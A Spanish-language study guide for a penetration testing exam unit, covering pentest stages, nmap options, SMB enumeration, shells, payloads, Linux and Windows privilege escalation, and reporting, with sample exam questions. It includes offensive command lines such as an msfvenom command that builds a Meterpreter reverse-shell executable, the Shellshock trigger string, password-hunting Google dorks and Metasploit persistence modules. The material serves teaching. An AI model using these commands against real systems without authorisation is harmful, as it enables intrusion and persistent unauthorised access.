# 🎯 GUÍA DE ESTUDIO - UNIDAD 8: Penetration Testing
## Método para Examen Multiple Choice

---

## 📚 PARTE 1: DEFINICIÓN Y CONCEPTOS BÁSICOS

### 🔑 ¿QUÉ ES UN PENETRATION TESTING?

**DEFINICIÓN CLAVE:**
Intento **autorizado y ético** de probar y analizar las defensas de seguridad de un sistema, redes o aplicaciones para **proteger** estos activos.

**PALABRAS CLAVE:**
- **AUTORIZADO** (con permiso)
- **ÉTICO** (no malicioso)
- Usa mismas herramientas/técnicas que un atacante real

**OBJETIVOS:**
1. Identificar y evaluar **vulnerabilidades**
2. Determinar **impacto potencial** de explotación
3. Evaluar **efectividad** de controles existentes
4. Proporcionar **recomendaciones** para mejorar seguridad

**💡 ASOCIACIÓN:**
Pentest = Hackear **CON PERMISO** para **PROTEGER**

---

### 🔑 ÉTICA DEL PENETRATION TESTING

**PRINCIPIOS:**
- **Profesionalismo**
- **Legalidad**
- **Transparencia**
- **Respeto** por privacidad y seguridad

**💡 IMPORTANTE:**
No solo protege reputación del tester, mejora seguridad de organizaciones y promueve prácticas responsables.

---

### 🔑 ROE (RULES OF ENGAGEMENT)

**DEFINICIÓN:**
Documento que se crea en **etapas iniciales** del pentest. Es un **acuerdo detallado** entre cliente y equipo de pruebas.

**QUÉ INCLUYE:**
- **Permiso explícito** para realizar pruebas
- **Límites, condiciones y alcance**
- Qué sistemas pueden ser evaluados
- Cuándo y cómo pueden realizarse
- Qué técnicas están permitidas/prohibidas
- Cómo se informarán hallazgos
- Qué acciones tomar para mitigar riesgos

**💡 ASOCIACIÓN:**
ROE = **Contrato** que define **QUÉ, CÓMO, CUÁNDO y DÓNDE** del pentest

**❓ PREGUNTA TIPO EXAMEN:**
> *¿Qué es el ROE en un pentest?*
- ✅ Acuerdo que establece límites, condiciones y alcance
- ❌ Una herramienta de escaneo
- ❌ Un tipo de exploit

> *¿Cuándo se crea el ROE?*
- ✅ En las etapas iniciales del pentest
- ❌ Después de la explotación
- ❌ En el reporte final

---

### 🔑 PLATAFORMAS PARA PRACTICAR

**EJEMPLOS:**
- **Dockerlabs** → Máquinas vulnerables en contenedores
- **HackTheBox**
- **TryHackMe**
- **VulnHub**

**BUG BOUNTY:**
Programas que **recompensan** a investigadores por encontrar y reportar vulnerabilidades.

**PLATAFORMAS BUG BOUNTY:**
- HackerOne
- Bugcrowd
- Intigriti

**CONSIDERACIONES LEGALES:**
- ✅ Verificar scope y reglas
- ❌ **NUNCA** explotar datos sensibles en producción sin permiso
- ✅ Leer contrato y políticas de divulgación

---

### 🔑 SISTEMAS OPERATIVOS PARA SEGURIDAD

**PRINCIPALES:**
- **Kali Linux** ⭐ (el más usado)
- Kali Purple
- Parrot OS
- BlackArch Linux
- Wifislax

**💡 ASOCIACIÓN:**
Kali Linux = **Distribución especializada** en pentesting

---

## 📚 PARTE 2: ETAPAS DE UN PENETRATION TESTING

### 🔑 LAS 5 ETAPAS (¡MUY IMPORTANTE!)

**TABLA DE ETAPAS:**

| # | Etapa | Qué se hace | Palabras clave |
|---|-------|-------------|----------------|
| **1** | **Information Gathering** | Recopilar información sobre el objetivo | Passive + Active, OSINT |
| **2** | **Reconocimiento/Enumeración** | Descubrir hosts, puertos, servicios | Nmap, escaneo |
| **3** | **Explotación (Acceso Inicial)** | Explotar vulnerabilidades | Exploit, shell |
| **4** | **Post-Explotación** | Escalación, movimiento lateral, persistencia | Privilegios, pivoting |
| **5** | **Reporte** | Documentar hallazgos y recomendaciones | Técnico + Ejecutivo |

**💡 REGLA MNEMOTÉCNICA (IREPR):**
- **I**nformation Gathering
- **R**econocimiento
- **E**xplotación
- **P**ost-explotación
- **R**eporte

**❓ PREGUNTA TIPO EXAMEN:**
> *¿En qué etapa se recopila información sin interactuar con el objetivo?*
- ✅ Information Gathering (passive)
- ❌ Explotación
- ❌ Post-explotación

> *¿En qué etapa se escalan privilegios?*
- ✅ Post-explotación
- ❌ Reconocimiento
- ❌ Information Gathering

---

## 📚 PARTE 3: INFORMATION GATHERING

### 🔑 TIPOS DE INFORMATION GATHERING

**TABLA COMPARATIVA:**

| Tipo | Interacción | Qué se hace | Ejemplos |
|------|-------------|-------------|----------|
| **Passive** | **SIN** interactuar con objetivo | Información de fuentes públicas | OSINT, WHOIS, Google Dorks, Shodan |
| **Active** | **CON** interacción con objetivo | Escaneo directo (necesita autorización) | Nmap, ping, port scanning |

**💡 DIFERENCIA CLAVE:**
- **Passive** = No toca el objetivo directamente
- **Active** = Sí toca el objetivo (requiere permiso)

---

### 🔑 PASSIVE INFORMATION GATHERING

**QUÉ BUSCAMOS:**
- IPs e información DNS
- Nombres de dominio y ownership
- Subdominios
- Emails y perfiles de redes sociales
- Tecnologías web utilizadas

**HERRAMIENTAS:**

**1. OSINT (Open-Source Intelligence):**
- **Fuentes**: Internet, registros públicos, medios, datos gubernamentales/comerciales

**2. Browsing Internet Resources:**
- Navegar sitio web de empresa objetivo
- Ver ofertas de empleo (tecnologías, contactos)

**3. Google Dorks (Google Hacking):**
- Búsquedas avanzadas con operadores especiales
- Ejemplos:
  - `site:*.sitename.com`
  - `inurl:passwd.txt`
  - `filetype:sql "MySQL dump" password`
- Recurso: https://www.exploit-db.com/google-hacking-database

**4. Shodan:**
- Motor de búsqueda de **dispositivos conectados a Internet**
- Indexa routers, servidores, IoT
- Muestra: IPs, servicios, puertos, vulnerabilidades
- https://www.shodan.io/

**5. Censys:**
- Similar a Shodan
- Escanea internet con **Zmap**
- https://search.censys.io/

**6. WHOIS:**
- Registro de quién posee un dominio
- Información de contacto, IPs públicas
- Comando: `whois <domain>`

**7. dnsrecon:**
- Reconocimiento y enumeración DNS
- Comando: `dnsrecon -d <domain>`
- Alternativa web: https://dnsdumpster.com/

**8. whatweb / Wappalyzer:**
- Identificar tecnologías del sitio web
- `whatweb https://example.com`

**9. wafw00f:**
- Detectar presencia de WAF (Web Application Firewall)
- `wafw00f https://example.com -a`

**10. Sublist3r:**
- Enumeración de subdominios
- `sublist3r -d <domain>`

**11. theHarvester:**
- Buscar emails
- `theHarvester -d <HOST> -b all`

**12. exiftool:**
- Extracción de metadatos de documentos
- `exiftool documento.pdf`

**13. HaveIBeenPwned:**
- Verificar si contraseñas fueron comprometidas
- https://haveibeenpwned.com/

**❓ PREGUNTAS TIPO EXAMEN:**

> *Shodan se utiliza para:*
- ✅ Buscar dispositivos conectados a Internet
- ❌ Escanear puertos localmente
- ❌ Compilar exploits

> *Google Dorks es una técnica de:*
- ✅ Búsqueda avanzada en Google
- ❌ Explotación de vulnerabilidades
- ❌ Escalación de privilegios

> *WHOIS proporciona información sobre:*
- ✅ Quién posee un dominio
- ❌ Vulnerabilidades del servidor
- ❌ Contraseñas de usuarios

> *¿Qué herramienta detecta la presencia de un WAF?*
- ✅ wafw00f
- ❌ nmap
- ❌ WHOIS

---

### 🔑 ACTIVE INFORMATION GATHERING

**QUÉ BUSCAMOS:**
- Puertos abiertos
- Infraestructura interna
- Enumeración de sistemas

---

### 🔑 HOST DISCOVERY

**TÉCNICAS:**

**1. Ping Sweep:**
- Envío de **ICMP Echo Request** (Type 8)
- Respuesta: **ICMP Echo Reply** (Type 0) = host vivo
- Comandos:
  - `nmap -sn <TARGET_NETWORK>`
  - `fping -I <interface> -g <TARGET_NETWORK> -a 2>/dev/null`

**2. ARP Scanning:**
- Usa **Address Resolution Protocol**
- Para descubrir hosts en red local
- Comandos:
  - `arp-scan -I <interface> --ignoredups <TARGET_NETWORK>`
  - `netdiscover -i <interface> -r <TARGET_NETWORK>`

**3. TCP SYN (Half-Open Scan):**
- Envía TCP SYN a puerto específico
- Respuesta SYN-ACK = host vivo
- Responde con RST (no establece conexión completa)
- Más sigiloso que ICMP

**💡 ASOCIACIÓN:**
- Ping = ICMP
- ARP = Red local
- TCP SYN = Más sigiloso

---

### 🔑 PORT SCANNING CON NMAP ⭐⭐⭐

**NMAP = Escáner de puertos por excelencia**

**PUERTOS/SERVICIOS COMUNES:**
- 20/21: FTP
- 22: SSH
- 23: Telnet
- 25: SMTP
- 53: DNS
- 80: HTTP
- 110: POP3
- 443: HTTPS
- 445: SMB
- 3306: MySQL
- 3389: RDP
- 8080: HTTP/Proxy

---

### 🔑 PARÁMETROS NMAP (¡MEMORIZAR!)

**TABLA DE PARÁMETROS:**

| Parámetro | Qué hace | Uso |
|-----------|----------|-----|
| `-p-` | Escanea **TODOS los 65535 puertos** | Completo |
| `--top-ports 1000` | Escanea top 1000 puertos | Rápido |
| `--open` | Reporta solo puertos **ABIERTOS** | Filtro |
| `-sS` | **Stealth Scan** (TCP SYN, Half-Open) | Sigiloso ⭐ |
| `-sT` | TCP Connect (conexión completa) | Cuando -sS no disponible |
| `-sU` | Escaneo **UDP** | UDP |
| `-sC` | Lanza **scripts básicos** de enumeración | Enum |
| `-sV` | Detecta **versión y servicios** | Versión ⭐ |
| `-O` | Detecta **sistema operativo** (agresivo) | OS |
| `-oN` | Exportar formato **normal** | Output |
| `-oG` | Exportar formato **grepeable** | Output |
| `-oX` | Exportar formato **XML** | Output |
| `-n` | No resolución DNS | Rápido |
| `-Pn` | Sin ping previo | Firewall |
| `--min-rate 5000` | Velocidad mínima de paquetes | Rápido |
| `-vvv` | Verbosidad alta | Detalles |

**COMANDOS TÍPICOS:**
```bash
# Escaneo inicial rápido
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn <IP> -oN tcpScan.txt

# Escaneo completo de puertos abiertos
nmap -sCV -p<puertos_abiertos> <IP> -oN fullScan.txt
```

**CATEGORÍAS DE SCRIPTS NSE:**
- **default**: Scripts básicos predeterminados
- **discovery**: Descubrimiento de red
- **safe**: Seguros, no invasivos
- **intrusive**: Invasivos (detectables)
- **vuln**: Detección de vulnerabilidades

**EJEMPLO:**
```bash
nmap -p445 --script "vuln and safe" <ip_victima>
```

**❓ PREGUNTAS TIPO EXAMEN:**

> *¿Qué parámetro de nmap es el más sigiloso?*
- ✅ -sS (Stealth Scan)
- ❌ -sT (TCP Connect)
- ❌ -O

> *Para escanear todos los puertos con nmap se usa:*
- ✅ -p-
- ❌ -p 1-65535
- ❌ --all-ports

> *¿Qué parámetro detecta versiones de servicios?*
- ✅ -sV
- ❌ -sS
- ❌ -O

> *-sC en nmap sirve para:*
- ✅ Lanzar scripts básicos de enumeración
- ❌ Escanear puertos TCP
- ❌ Exportar resultados

---

### 🔑 ENUMERACIÓN DE SUBDOMINIOS Y FUZZING

**SUBDOMINIOS (ACTIVO):**
- **gobuster** (https://github.com/OJ/gobuster)
- **wfuzz** (https://github.com/xmendez/wfuzz)
- Diccionario común: `/usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`

**FUZZING:**
Descubrir **rutas y recursos ocultos** en servidor web mediante **fuerza bruta**.

**HERRAMIENTAS:**
- gobuster
- wfuzz
- dirb
- dirbuster
- dirsearch

**DICCIONARIO COMÚN:**
`SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

**EJEMPLO GOBUSTER:**
```bash
gobuster dir -u <url> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 403,404 -x php,html,txt
```

**❓ PREGUNTA TIPO EXAMEN:**
> *Fuzzing se utiliza para:*
- ✅ Descubrir rutas y recursos ocultos en servidor web
- ❌ Escanear puertos abiertos
- ❌ Detectar sistema operativo

---

## 📚 PARTE 4: ENUMERACIÓN

### 🔑 ¿QUÉ SE ENUMERA?

**LISTA:**
- Enumeración de **servicios**
- Enumeración de **usuarios**
- Enumeración de **recursos compartidos**
- Enumeración de **políticas de seguridad**
- Enumeración de **vulnerabilidades**
- Enumeración de **vectores de ataque**

---

### 🔑 HERRAMIENTAS DE ENUMERACIÓN

**PRINCIPALES:**
- nmap (scripts)
- Metasploit Framework (módulos Auxiliary)
- **SMBMap** → Enumeración SMB
- **SMBClient** → Cliente SMB
- **enum4linux** → Enumeración Linux/SMB
- rpcclient
- smtp-user-enum
- wpscan (WordPress)
- droopscan (Drupal)

---

### 🔑 ENUMERACIÓN SMB (¡IMPORTANTE!)

**SMBClient:**
```bash
# Listar recursos con Null Session
smbclient -L <TARGET_IP> -N

# Conectar a recurso
smbclient //<TARGET_IP>/notes -N
smbclient //<TARGET_IP>/admin -U admin

# Comandos dentro:
help
put <filename>
get <filename>
```

**SMBMap:**
```bash
# Con Null Session
smbmap -H <TARGET_IP>
smbmap -u guest -p "" -d . -H <TARGET_IP>

# Con credenciales
smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>

# Explorar directorios
smbmap -H <TARGET_IP> -r notes

# Ejecutar comando
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'
```

**💡 ASOCIACIÓN:**
- SMB = Puerto **445**
- Null Session = Sin credenciales (guest)

**❓ PREGUNTA TIPO EXAMEN:**
> *¿Qué puerto usa SMB?*
- ✅ 445
- ❌ 443
- ❌ 3389

> *Una Null Session significa:*
- ✅ Conexión sin credenciales
- ❌ Conexión cifrada
- ❌ Conexión por SSH

---

## 📚 PARTE 5: EXPLOTACIÓN (ACCESO INICIAL)

### 🔑 TIPOS DE EXPLOTACIÓN

**TABLA COMPARATIVA:**

| Tipo | Características | Ventajas | Desventajas |
|------|-----------------|----------|-------------|
| **Manual** | Conocimiento profundo, control preciso | Mayor control, más preciso | Más lento, requiere habilidad |
| **Automatizada** | Scripts/herramientas automáticas | Más rápido, menos laborioso | Menos preciso, más ruido, detectable |

**💡 CONCEPTO:**
Tipo de explotación depende de: objetivos, habilidades, nivel de seguridad del objetivo

---

### 🔑 REVERSE SHELL vs BIND SHELL

**TABLA COMPARATIVA:**

| Tipo | Dirección | Cómo funciona | Ventaja |
|------|-----------|---------------|---------|
| **Reverse Shell** | Víctima → Atacante | Máquina comprometida se **conecta** al atacante | **Evade firewalls** (tráfico saliente) ⭐ |
| **Bind Shell** | Atacante → Víctima | Víctima se pone a la **escucha**, atacante se conecta | - |

**💡 ASOCIACIÓN:**
- **Reverse** = Víctima llama al atacante (más común)
- **Bind** = Atacante llama a la víctima

**❓ PREGUNTA TIPO EXAMEN:**
> *¿Qué tipo de shell evade mejor los firewalls?*
- ✅ Reverse Shell
- ❌ Bind Shell
- ❌ Ambas igual

> *En una Reverse Shell, ¿quién inicia la conexión?*
- ✅ La máquina comprometida
- ❌ El atacante
- ❌ El firewall

---

### 🔑 TIPOS DE PAYLOADS

**TABLA COMPARATIVA:**

| Tipo | Características | Ejemplo |
|------|-----------------|---------|
| **Staged** | Se divide en **2+ etapas** | Primera = conexión, Segunda = payload real |
| **Non-Staged** | Se envía **una sola entidad** | Todo el código en un solo paquete |

**STAGED:**
- **Ventaja**: Sortea medidas de seguridad (payload real después)
- **Desventaja**: Más complejo

**NON-STAGED:**
- **Ventaja**: Más simple
- **Desventaja**: Más fácil de detectar

**HERRAMIENTA:**
**msfvenom** → Genera payloads

**EJEMPLO:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=192.168.1.165 LPORT=4646 -f exe -o reverse.exe
```

**❓ PREGUNTA TIPO EXAMEN:**
> *Un payload Staged se caracteriza por:*
- ✅ Dividirse en múltiples etapas
- ❌ Enviarse todo de una vez
- ❌ Ser más fácil de detectar

---

### 🔑 HERRAMIENTAS DE EXPLOTACIÓN

**METASPLOIT FRAMEWORK:**
- Open-source (Rapid7)
- Desarrollado en **Ruby**
- Base de datos de exploits públicos más grande
- Modular

**BURPSUITE:**
- Auditoría de seguridad en **aplicaciones web**
- Desarrollado por PortSwigger
- **Características**:
  - **Proxy de interceptación** → Interceptar/modificar HTTP
  - Escáner de vulnerabilidades (versión pro)
  - **Repeater** → Modificar y enviar requests manualmente
  - **Intruder** → Fuerza bruta, fuzzing

**SQLMAP:**
- Open source
- Automatiza detección y explotación de **SQL Injection**
- Muy poderosa para SQLi

**❓ PREGUNTA TIPO EXAMEN:**
> *Metasploit está desarrollado en:*
- ✅ Ruby
- ❌ Python
- ❌ C++

> *BurpSuite se especializa en:*
- ✅ Auditoría de aplicaciones web
- ❌ Escaneo de puertos
- ❌ Análisis de malware

> *SQLMap se usa para:*
- ✅ Detectar y explotar SQL Injection
- ❌ Escanear redes
- ❌ Generar payloads

---

### 🔑 CASO: SHELLSHOCK (CVE-2014-6271)

**DEFINICIÓN:**
Vulnerabilidad en **Bash** (desde V1.3) que permite ejecutar comandos arbitrarios remotos.

**CÓMO FUNCIONA:**
- Bash ejecuta por error comandos después de: `() {:;};`
- Servidores Apache con scripts **CGI** o **.sh** son vulnerables

**EXPLOTACIÓN:**
- Localizar vector de entrada o script CGI
- Al ejecutarse script CGI → servidor inicia proceso con Bash
- Se puede explotar manual o automatizado (MSF)

**💡 ASOCIACIÓN:**
Shellshock = Bash + CGI = RCE

---

## 📚 PARTE 6: POST-EXPLOTACIÓN

### 🔑 ¿QUÉ ES POST-EXPLOTACIÓN?

**DEFINICIÓN:**
Acciones después de obtener acceso inicial.

**TAREAS:**
1. **Enumeración local**
2. **Escalación de privilegios** ⭐
3. Acceso a credenciales
4. **Movimiento Lateral / Pivoting**
5. **Persistencia**
6. Limpiar rastros

---

### 🔑 ENUMERACIÓN LOCAL

**QUÉ BUSCAR:**
- Versión exacta de SO y arquitectura (x64/x86)
- OS Build & Service Pack / Kernel version
- Updates/Hotfixes instalados
- Usuario actual y privilegios
- Otros usuarios en el sistema
- Grupos existentes
- Miembros de "Administrators"
- Adaptadores de red y rutas
- Servicios corriendo
- Tareas scheduladas / cron jobs

**HERRAMIENTAS:**
- Scripts de enumeración automática
- Comandos nativos del SO

---

### 🔑 ESCALACIÓN DE PRIVILEGIOS

**DEFINICIÓN:**
Proceso de **aumentar privilegios** en sistema comprometido para obtener privilegios más altos (ej: root, Administrator).

**SE ABUSA DE:**
- Vulnerabilidades existentes
- Malas configuraciones

**VARÍA SEGÚN:** Sistema operativo (Linux vs Windows)

---

## 📚 PARTE 7: ESCALACIÓN EN LINUX

### 🔑 HERRAMIENTAS LINUX

**LinEnum:**
- Identifica vulnerabilidades para escalar privilegios
- https://github.com/rebootuser/LinEnum

**Linux Exploit Suggester:**
- Detecta deficiencias de seguridad del kernel
- https://github.com/mzet-/linux-exploit-suggester

---

### 🔑 TÉCNICAS DE ESCALACIÓN EN LINUX

**LISTA DE TÉCNICAS:**

1. **Explotación de permisos SUID** ⭐⭐
2. **Abuso de sudoers** ⭐⭐
3. **Explotación de capabilities**
4. **Uso de exploits del kernel** (ej: DirtyCOW - CVE-2016-5195)
5. **Path Hijacking**
6. **Cron Jobs mal configurados** ⭐
7. **Writable files** (archivos críticos con permisos mal otorgados)

---

### 🔑 PERMISOS EN LINUX

**NOTACIÓN:**
- `(-)` Sin permiso
- `(r)` Lectura
- `(w)` Escritura
- `(x)` Ejecución

**ASIGNACIÓN:**
- Comando `chmod`
- Notación octal (ej: 755, 644)

**PERMISOS ESPECIALES:**
- **SUID** (Set User ID) ⭐

---

### 🔑 ABUSO DE SUID ⭐⭐⭐

**DEFINICIÓN:**
Cuando el bit **SUID** está activado en un binario, quien lo ejecute tendrá los **mismos permisos que el propietario**.

**EJEMPLO LEGÍTIMO:**
`passwd` → Necesita privilegios root para modificar `/etc/passwd` o `/etc/shadow`

**RIESGO:**
Algunos binarios del sistema con SUID permiten obtener shell como root desde usuario no privilegiado.

**BUSCAR SUID:**
```bash
find / -perm -4000 2>/dev/null
```

**RECURSO:**
https://gtfobins.github.io/

**💡 ASOCIACIÓN:**
SUID = Ejecutar como **propietario** del archivo

**❓ PREGUNTA TIPO EXAMEN:**
> *SUID permite:*
- ✅ Ejecutar binario con permisos del propietario
- ❌ Solo leer archivos
- ❌ Escribir en cualquier directorio

> *¿Qué comando busca binarios con SUID?*
- ✅ find / -perm -4000 2>/dev/null
- ❌ chmod +x
- ❌ sudo -l

---

### 🔑 ABUSO DE SUDOERS ⭐⭐⭐

**ARCHIVO:**
`/etc/sudoers` → Lista de usuarios/grupos con permisos sudo

**COMANDO SUDO:**
Permite ejecutar comandos como superusuario o con privilegios especiales.

**IDENTIFICAR:**
```bash
sudo -l
```

**RIESGO:**
Si atacante accede a cuenta con sudo mal configurado → puede ejecutar comandos privilegiados.

**RECURSO:**
https://gtfobins.github.io/

**❓ PREGUNTA TIPO EXAMEN:**
> *¿Qué archivo controla los permisos de sudo?*
- ✅ /etc/sudoers
- ❌ /etc/passwd
- ❌ /etc/shadow

> *Para ver qué comandos puede ejecutar un usuario con sudo:*
- ✅ sudo -l
- ❌ sudo --list
- ❌ cat /etc/sudoers

---

### 🔑 ABUSO DEL KERNEL

**DEFINICIÓN:**
Explotar vulnerabilidades en el **kernel** (parte central del SO) que administra recursos.

**MITIGACIÓN:**
Mantener sistema actualizado y aplicar parches.

**EJEMPLO FAMOSO:**
**DirtyCOW** (CVE-2016-5195)

---

### 🔑 TAREAS CRON ⭐⭐

**DEFINICIÓN:**
Tareas **programadas** en Unix/Linux que se ejecutan en intervalos de tiempo.

**ARCHIVO:**
`crontab` → Define qué comandos y cuándo ejecutar

**RIESGO:**
Si archivo ejecutado por **root** tiene **permisos mal configurados** → atacante puede modificarlo para incluir código malicioso que se ejecutará como root.

**HERRAMIENTA:**
**PsPy** → Encontrar binarios que se ejecutan a intervalos regulares
- https://github.com/DominicBreuker/pspy

**RECURSO ÚTIL:**
https://www.site24x7.com/es/tools/crontab/cron-generator.html

**❓ PREGUNTA TIPO EXAMEN:**
> *Las tareas cron se definen en:*
- ✅ crontab
- ❌ /etc/passwd
- ❌ sudoers

> *PsPy se usa para:*
- ✅ Encontrar binarios que se ejecutan periódicamente
- ❌ Escanear puertos
- ❌ Generar payloads

---

### 🔑 PATH HIJACKING

**DEFINICIÓN:**
Técnica para **secuestrar comandos** mediante manipulación del **PATH**.

**PATH:**
Variable de entorno que define rutas de búsqueda para ejecutables.

**CÓMO FUNCIONA:**
1. Binario usa comando con **ruta relativa** (ej: `ls`) en vez de **ruta absoluta** (ej: `/bin/ls`)
2. Atacante altera PATH
3. Atacante crea archivo malicioso con mismo nombre (`ls`)
4. Binario ejecuta versión maliciosa

**PREVENCIÓN:**
Usar **rutas absolutas** en binarios compilados.

---

### 🔑 PYTHON LIBRARY HIJACKING

**DEFINICIÓN:**
Aprovecha cómo Python busca y carga bibliotecas para inyectar código malicioso.

**CÓMO FUNCIONA:**
1. Atacante reemplaza biblioteca por versión maliciosa
2. Coloca versión maliciosa en ruta accesible
3. Python carga la maliciosa en vez de legítima

**ORDEN DE BÚSQUEDA:**
1. **Directorio actual de trabajo** (primero)
2. Rutas en **sys.path**

**RIESGO:**
Si atacante tiene acceso de escritura en `sys.path` o directorio actual → puede secuestrar bibliotecas.

---

### 🔑 ABUSO DE CAPABILITIES

**DEFINICIÓN:**
Funcionalidad que permite realizar acciones que normalmente requieren root, **sin** dar acceso completo de superusuario.

**BENEFICIO:**
Ejecutar tareas privilegiadas con **mínimos permisos** necesarios.

**RIESGO:**
Asignación arbitraria puede ser aprovechada para operaciones no contempladas.

**LISTAR CAPABILITIES:**
```bash
getcap -r / 2>/dev/null
```

---

### 🔑 ARCHIVOS CRÍTICOS CON PERMISOS MAL OTORGADOS

**EJEMPLOS:**
- `/etc/passwd` → Información de usuarios
- `/etc/shadow` → Contraseñas hasheadas

**RIESGO:**
Si tienen permisos de escritura → atacante puede modificarlos para escalar privilegios.

---

## 📚 PARTE 8: ESCALACIÓN EN WINDOWS

### 🔑 METODOLOGÍA WINDOWS

**PROCESO:**
1. Identificación de vulnerabilidades en kernel
2. Descargar, compilar y transferir exploits

**HERRAMIENTAS:**

**Windows Exploit Suggester:**
- Compara niveles de parches con base de datos Microsoft
- https://github.com/AonCyberLabs/Windows-Exploit-Suggester

**WES-NG (Next Generation):**
- https://github.com/bitsadmin/wesng

**PowerUp.ps1 (PowerSploit):**
- Script PowerShell para escalación por malas configuraciones
- https://github.com/PowerShellMafia/PowerSploit

---

### 🔑 UAC BYPASS

**UAC (User Account Control):**
Garantiza que cambios en SO requieran aprobación de administrador.

**BYPASS UAC:**
Ejecutar proceso sin que UAC proporcione aprobación.

**CONDICIONES PARA BYPASS:**
1. Usuario debe formar parte de grupo **Administradores**
2. Contexto de **integridad** debe ser **media** (por defecto)
3. Política de UAC debe estar en configuración **por defecto**

**VERIFICAR:**
```bash
net user <USERNAME>
net localgroup administrators
```

**💡 IMPORTANTE:**
Herramientas y técnicas varían según versión de Windows.

---

## 📚 PARTE 9: PIVOTING Y PERSISTENCIA

### 🔑 PIVOTING

**DEFINICIÓN:**
Técnica de post-explotación para acceder a **redes a las que no tenemos acceso** normalmente mediante máquina comprometida.

**OBJETIVO:**
Llegar a donde al principio no podíamos.

**💡 ASOCIACIÓN:**
Pivoting = Usar máquina comprometida como **puente** a otras redes

---

### 🔑 PERSISTENCIA

**DEFINICIÓN:**
Técnicas para **mantener el acceso** tras reinicios, cambios de credenciales u otras interrupciones.

**MÓDULOS METASPLOIT:**
- Windows: `exploit/windows/local/persistence_service`
- Linux: `post/linux/manage/sshkey_persistence`

**💡 OBJETIVO:**
Garantizar acceso continuo al sistema comprometido.

---

## 📚 PARTE 10: REPORTE (ETAPA 5)

### 🔑 IMPORTANCIA DE DOCUMENTAR

**DURANTE EL PENTEST:**
Documentar **todas las acciones y procedimientos**.

**CONTENIDO:**
- Qué trabajo se realizó
- Cómo se hizo (herramientas y técnicas)
- **Vulnerabilidades descubiertas** (lo más importante)

---

### 🔑 DOS TIPOS DE REPORTE

**TABLA COMPARATIVA:**

| Tipo | Audiencia | Contenido | Nivel técnico |
|------|-----------|-----------|---------------|
| **Informe Técnico** | Técnicos, analistas | Gran nivel de detalle, herramientas, resultados, **cómo subsanar riesgos** | **ALTO** |
| **Informe Ejecutivo** | Dirección, gerencia | Vulnerabilidades encontradas sin detalles técnicos, **cualquiera puede entender** | **BAJO** |

**💡 DIFERENCIA CLAVE:**
- **Técnico** = Cómo se hizo + Cómo arreglarlo (detallado)
- **Ejecutivo** = Qué se encontró (simple y ameno)

**❓ PREGUNTA TIPO EXAMEN:**
> *¿Qué tipo de informe es para la alta dirección?*
- ✅ Informe Ejecutivo
- ❌ Informe Técnico
- ❌ Ambos por igual

> *El informe técnico debe incluir:*
- ✅ Nivel de detalle alto con herramientas y cómo subsanar
- ❌ Solo vulnerabilidades sin detalles
- ❌ Solo resumen ejecutivo

---

## 🎯 RESUMEN ULTRA-RÁPIDO (Para 10 min antes del examen)

### 📌 DEFINICIÓN:
Pentest = Hackear **CON PERMISO** para **PROTEGER**

### 📌 ROE:
Acuerdo que establece **límites, condiciones y alcance** (etapas iniciales)

### 📌 5 ETAPAS (IREPR):
1. **I**nformation Gathering (Passive + Active)
2. **R**econocimiento/Enumeración (nmap)
3. **E**xplotación (exploit, shell)
4. **P**ost-explotación (escalación, persistencia)
5. **R**eporte (Técnico + Ejecutivo)

### 📌 INFORMATION GATHERING:
- **Passive** = SIN tocar objetivo (OSINT, WHOIS, Shodan, Google Dorks)
- **Active** = CON interacción (nmap, ping, escaneo)

### 📌 NMAP CLAVE:
- `-p-` = Todos los puertos
- `-sS` = Stealth Scan (sigiloso)
- `-sV` = Detectar versión
- `-sC` = Scripts básicos
- `--open` = Solo abiertos

### 📌 SHELLS:
- **Reverse** = Víctima → Atacante (evade firewall)
- **Bind** = Atacante → Víctima

### 📌 PAYLOADS:
- **Staged** = Múltiples etapas
- **Non-Staged** = Una sola vez

### 📌 HERRAMIENTAS:
- **Metasploit** = Framework de exploits (Ruby)
- **BurpSuite** = Auditoría web
- **SQLMap** = SQL Injection
- **msfvenom** = Generar payloads

### 📌 ESCALACIÓN LINUX (técnicas):
1. **SUID** → `find / -perm -4000`
2. **sudoers** → `sudo -l`
3. **Cron jobs** → PsPy
4. **Kernel** → DirtyCOW
5. **Capabilities** → `getcap -r /`
6. **Path Hijacking**
7. **Writable files**

### 📌 ESCALACIÓN WINDOWS:
- UAC Bypass
- Kernel exploits
- Windows Exploit Suggester
- PowerUp.ps1

### 📌 POST-EXPLOTACIÓN:
- Enumeración local
- Escalación privilegios
- **Pivoting** = Acceso a otras redes
- **Persistencia** = Mantener acceso

### 📌 REPORTE:
- **Técnico** = Alto detalle (para técnicos)
- **Ejecutivo** = Simple (para dirección)

### 📌 PUERTOS COMUNES:
21=FTP | 22=SSH | 80=HTTP | 443=HTTPS | 445=SMB | 3306=MySQL | 3389=RDP

### 📌 RECURSOS:
- gtfobins.github.io (SUID, sudo)
- exploit-db.com (Google Dorks)

---

## 🔥 ESTRATEGIA PARA EL EXAMEN

### ✅ Palabras clave en preguntas:

**Si ves:** "sin tocar objetivo" / "fuentes públicas" → **Passive Info Gathering**
**Si ves:** "escanear puertos" / "interactuar" → **Active Info Gathering**
**Si ves:** "sigiloso" / "stealth" → **-sS** (nmap)
**Si ves:** "todos los puertos" → **-p-**
**Si ves:** "detectar versión" → **-sV**
**Si ves:** "evade firewall" → **Reverse Shell**
**Si ves:** "múltiples etapas" → **Staged payload**
**Si ves:** "Ruby" → **Metasploit**
**Si ves:** "aplicaciones web" → **BurpSuite**
**Si ves:** "SQL Injection" → **SQLMap**
**Si ves:** "ejecutar como propietario" → **SUID**
**Si ves:** "sudo -l" → **sudoers**
**Si ves:** "tareas programadas" → **Cron jobs**
**Si ves:** "dispositivos conectados Internet" → **Shodan**
**Si ves:** "búsqueda avanzada Google" → **Google Dorks**
**Si ves:** "puente a otras redes" → **Pivoting**
**Si ves:** "mantener acceso" → **Persistencia**
**Si ves:** "alta dirección" / "simple" → **Informe Ejecutivo**
**Si ves:** "detalle técnico" → **Informe Técnico**
**Si ves:** "puerto 445" → **SMB**
**Si ves:** "puerto 3389" → **RDP**

---

## 💪 ¡Éxito en tu examen!

**Recuerda:** Esta unidad es **muy práctica** y se centra en:
